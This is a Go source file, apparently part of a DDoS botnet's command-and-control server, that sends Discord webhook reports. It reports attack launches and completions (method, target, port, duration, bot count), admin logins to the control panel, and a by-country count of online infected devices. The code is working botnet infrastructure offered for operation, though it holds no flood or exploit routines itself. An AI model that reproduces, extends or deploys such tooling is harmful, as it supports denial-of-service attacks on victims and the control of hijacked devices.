package main

// webhook.go — Discord report hooks. Posts rich embeds to a single webhook URL
// for attack launches/completions, logins and a periodic fleet digest. Fully
// optional: with YB_WEBHOOK unset every call is a no-op.

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"sort"
	"sync"
	"time"
)

const webhookTimeout = 6 * time.Second

var (
	webhookURL = env("YB_WEBHOOK", CfgWebhookURL)
	whMu       sync.Mutex
	whClient   = &http.Client{Timeout: webhookTimeout}
)

func hookEnabled() bool { return webhookURL != "" }

// postEmbed posts a single rich Embed to the webhook. Never blocks the caller
// on the network; runs in its own goroutine.
func postEmbed(title, desc string, color int, fields []map[string]interface{}) {
	url := webhookURL
	if url == "" {
		return
	}
	go func() {
		defer func() { _ = recover() }()
		emb := map[string]interface{}{
			"title":       title,
			"description": desc,
			"color":       color,
			"timestamp":   time.Now().UTC().Format(time.RFC3339),
		}
		if len(fields) > 0 {
			emb["fields"] = fields
		}
		payload := map[string]interface{}{"embeds": []interface{}{emb}}
		body, err := json.Marshal(payload)
		if err != nil {
			return
		}
		resp, err := whClient.Post(url, "application/json", bytes.NewReader(body))
		if err != nil {
			return
		}
		_ = resp.Body.Close()
	}()
}

// Colors: green for state-up, red for attacks, purple for joins/logins.
const (
	whGreen  = 0x57F287
	whRed    = 0xED4245
	whPurple = 0x9B59B6
	whGrey   = 0x99AAB5
)

// Webhook launch / finish events called from attack registration.
func hookAttackLaunch(user, method, target string, port, dur int) {
	if !hookEnabled() {
		return
	}
	f := []map[string]interface{}{
		{"name": "User", "value": user, "inline": true},
		{"name": "Method", "value": method, "inline": true},
		{"name": "Target", "value": target, "inline": true},
		{"name": "Port", "value": port, "inline": true},
		{"name": "Duration", "value": fmt.Sprintf("%ds", dur), "inline": true},
		{"name": "Bots", "value": clientList.Count(), "inline": true},
	}
	postEmbed("Attack launched", fmt.Sprintf("**%s** -> `%s:%d` for %ds", method, target, port, dur), whPurple, f)
}

func hookAttackFinish(user, method, target string, port, dur int) {
	if !hookEnabled() {
		return
	}
	f := []map[string]interface{}{
		{"name": "User", "value": user, "inline": true},
		{"name": "Method", "value": method, "inline": true},
		{"name": "Target", "value": target, "inline": true},
		{"name": "Port", "value": port, "inline": true},
		{"name": "Duration", "value": fmt.Sprintf("%ds", dur), "inline": true},
	}
	postEmbed("Attack finished", fmt.Sprintf("**%s** -> `%s:%d` completed (%ds)", method, target, port, dur), whRed, f)
}

func hookLogin(username string) {
	if !hookEnabled() {
		return
	}
	postEmbed("Admin login", "user **"+username+"** connected to the control panel", whGreen, nil)
}

// hookFleet posts a cooldown-limited digest of online bots. Only fires at most
// once per min so the Discord thread doesn't get spammed by churn.
func hookFleet() {
	if !hookEnabled() {
		return
	}
	dist := clientList.ByCountry()
	total := 0
	keys := make([]string, 0, len(dist))
	for _, n := range dist {
		total += n
	}
	for k := range dist {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	desc := fmt.Sprintf("**%d** devices online\n", total)
	for _, k := range keys {
		desc += fmt.Sprintf("  `%s` %d\n", k, dist[k])
	}
	postEmbed("Fleet status", desc, whGrey, nil)
}